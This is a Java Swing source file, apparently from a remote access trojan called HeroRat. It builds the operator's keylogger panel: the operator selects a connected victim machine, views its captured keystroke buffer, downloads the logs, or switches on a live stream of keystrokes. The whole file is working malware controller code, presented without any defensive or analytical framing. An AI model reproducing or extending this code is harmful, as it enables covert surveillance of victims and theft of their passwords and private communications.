package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import net.herorat.features.keylogger.Keylogger;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;


public class PanelKeylogger extends JPanel
{	
	private static final long serialVersionUID = -3873818066335138946L;
	
	private JLabel label_select;
	public JComboBox<String> combo_select;
	public String combo_selected_item = "";
	
	private JScrollPane scroll_output;
	public JTextArea area_output;
	
	private JPanel panel_bottom;
	private JButton button_download;
	private JCheckBox box_live;

	public PanelKeylogger()
	{
		initComponents();
		display();
	}
	
	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createSelect();
		createOutput();
		createPanel();
	}
	
	private void display()
	{
		setVisible(true);
	}
	
	private void createSelect()
	{
		label_select = new JLabel("Select an user: ");
		combo_select = new JComboBox<String>( Network.getServerList(false) );
		
		JPanel top_panel = new JPanel();
		top_panel.setLayout(new BorderLayout(5, 0));
		top_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 5, 2));
		top_panel.add(label_select, BorderLayout.LINE_START);
		top_panel.add(combo_select);
		add(top_panel, BorderLayout.NORTH);
		
		combo_select.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent arg0)
			{
				String selection = String.valueOf(combo_select.getSelectedItem());
				if (combo_select.getSelectedIndex() != 0 && !selection.equals(combo_selected_item))
				{
					combo_selected_item = selection;
					area_output.setText("Loading ...");
					Server server = Network.findWithCombo(combo_selected_item);
					if (server != null)
					{
						area_output.setText(server.buffer_logger.toString());
						button_download.setEnabled(true);
						box_live.setEnabled(true);
					}
				}
				else if (combo_select.getSelectedIndex() == 0)
				{
					combo_selected_item = "";
					area_output.setText("");
					button_download.setEnabled(false);
					box_live.setEnabled(false);
				}
			}
		});
	}
	
	private void createOutput()
	{
		scroll_output = new JScrollPane();
		area_output = new JTextArea();
		area_output.setColumns(55);
		area_output.setRows(22);
		area_output.setEditable(false);
		area_output.setLineWrap(true);
		scroll_output.setViewportView(area_output);
		add(scroll_output, BorderLayout.CENTER);
	}
	
	private void createPanel()
	{
		panel_bottom = new JPanel();
		panel_bottom.setLayout(new BorderLayout(5, 0));
		panel_bottom.setBorder(BorderFactory.createEmptyBorder(0, 2, 0, 2));
		
		button_download = new JButton("Download logs");
		button_download.setPreferredSize(new Dimension(300, 25));
		button_download.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) Keylogger.sendDownload(server);
			}
		});
		
		box_live = new JCheckBox("Live stream");
		box_live.setPreferredSize(new Dimension(100, 25));
		box_live.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent evt)
			{
				Server server = Network.findWithCombo(combo_selected_item);
				if (server != null) Keylogger.sendLive(server, box_live.isSelected());
			}
		});
		
		panel_bottom.add(button_download, BorderLayout.LINE_START);
		panel_bottom.add(box_live, BorderLayout.LINE_END);
		add(panel_bottom, BorderLayout.SOUTH);
		
		button_download.setEnabled(false);
		box_live.setEnabled(false);
	}
}